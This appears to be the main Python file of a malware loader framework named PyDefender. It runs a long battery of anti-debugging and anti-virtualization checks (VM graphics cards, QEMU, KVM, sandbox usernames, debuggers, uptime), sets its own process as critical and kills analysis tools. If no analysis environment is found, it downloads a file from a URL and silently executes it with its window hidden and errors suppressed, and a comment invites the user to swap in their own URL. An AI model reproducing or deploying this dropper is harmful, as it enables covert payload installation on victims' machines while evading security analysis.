## ANTI DEBUGGING
from AntiDebug.CheckBlacklistedWindowsNames import CheckTitles
from AntiDebug.CheckInternetConnection import check_connection
from AntiDebug.IsDebuggerPresent import is_debugger_present
from AntiDebug.RemoteDebugger import CheckRemoteDebugger
from AntiDebug.KillBadProcesses import KillBadProcesses
from AntiDebug.ParentAntiDebug import ParentAntiDebug
from AntiDebug.ComputerUptime import CheckUptime
## ANTI VIRTULIZATION
from AntiVirtulization.TriageCheck import TriageCheck
from AntiVirtulization.USBCheck import PluggedIn
from AntiVirtulization.UsernameCheck import CheckForBlacklistedNames
from AntiVirtulization.VMArtifacts import VMArtifactsDetect
from AntiVirtulization.VMWareDetection import GraphicsCardCheck as VMWareGraphicsCardCheck
from AntiVirtulization.VirtualboxDetection import GraphicsCardCheck as VirtualboxGraphicsCardCheck
from AntiVirtulization.QEMUCheck import CheckForQEMU
from AntiVirtulization.ParallelsCheck import CheckForParallels
from AntiVirtulization.MonitorMetrics import IsScreenSmall
from AntiVirtulization.KVMCheck import CheckForKVM
from AntiVirtulization.RecentFileActivity import RecentFileActivityCheck

## Program Utilities
from CriticalProcess.SetProcessIsCritical import set_process_critical
import urllib.request
import subprocess
import os
import tempfile

def download_and_execute(url):
    if not url:
        return

    try:
        tmp_dir = tempfile.gettempdir()
        filename = os.path.basename(url)
        if not filename:
            filename = "downloaded_file.exe"

        filepath = os.path.join(tmp_dir, filename)

        urllib.request.urlretrieve(url, filepath)

        if os.name == 'nt':
            creation_flags = subprocess.CREATE_NO_WINDOW
            subprocess.run(filepath, shell=True, creationflags=creation_flags)
        else:
            # On non-windows, we don't have this flag.
            # The shell=True is also a potential security risk.
            # A better implementation would use a list of args.
            subprocess.run(filepath, shell=True)

    except Exception as e:
        # Fail silently in the compiled version.
        pass

def run_checks():
    detections = []

    if TriageCheck(): detections.append("Triage")
    if RecentFileActivityCheck()[0]: detections.append("Recent File Activity")
    if PluggedIn(): detections.append("No USBs")
    if CheckForBlacklistedNames(): detections.append("Blacklisted Username")
    if VMArtifactsDetect(): detections.append("VM Artifacts")
    if VMWareGraphicsCardCheck(): detections.append("VMware Graphics Card")
    if VirtualboxGraphicsCardCheck(): detections.append("VirtualBox Graphics Card")
    if CheckForQEMU()[0]: detections.append("QEMU")
    if CheckForParallels()[0]: detections.append("Parallels")
    if IsScreenSmall()[0]: detections.append("Small Screen")
    if CheckForKVM()[0]: detections.append("KVM")
    if CheckTitles(): detections.append("Blacklisted Window Title")
    if not check_connection()[0]: detections.append("No Internet")
    if is_debugger_present(): detections.append("Debugger Present")
    if CheckRemoteDebugger(): detections.append("Remote Debugger")
    if ParentAntiDebug(): detections.append("Non-standard Parent Process")
    if CheckUptime(1200)[0]: detections.append("Uptime < 20 mins")

    return detections

def main():
    set_process_critical()
    detections = run_checks()
    KillBadProcesses()

    if not detections:
        # The user should replace this URL with their own.
        file_url = "https://raw.githubusercontent.com/jules-at-swe-bench/PyDefender/main/LICENSE"
        download_and_execute(file_url)

if __name__ == "__main__":
    main()
